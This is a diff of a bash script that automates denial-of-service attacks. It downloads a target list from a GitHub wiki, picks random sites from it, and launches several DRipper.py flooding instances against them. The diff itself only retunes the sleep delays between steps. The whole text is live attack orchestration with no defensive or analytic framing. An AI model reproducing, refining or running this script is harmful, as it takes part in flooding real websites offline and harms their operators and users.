@@ -37,12 +37,10 @@ do
    list_size=$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/DRipper_targets | cat | wc -l)
    
    echo -e "\nNumber of targets in list: " $list_size "\n"
-   sleep 1
 
    # Get random numbers to choose multiple targets from DRipper_targets
    random_numbers=$(shuf -i 1-$list_size -n $num_of_targets)
    echo -e "random numbers: " $random_numbers "\n"
-   sleep 1
    
    # Print targets on screen
    echo "Choosen targets:"
@@ -50,8 +48,10 @@ do
    do
              site=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/DRipper_targets | cat)")
              echo $site
-             sleep 0.3
+             sleep 0.2
    done
+   
+   sleep 2
    
    # Launch multiple DRipper.py instances
    for i in $random_numbers
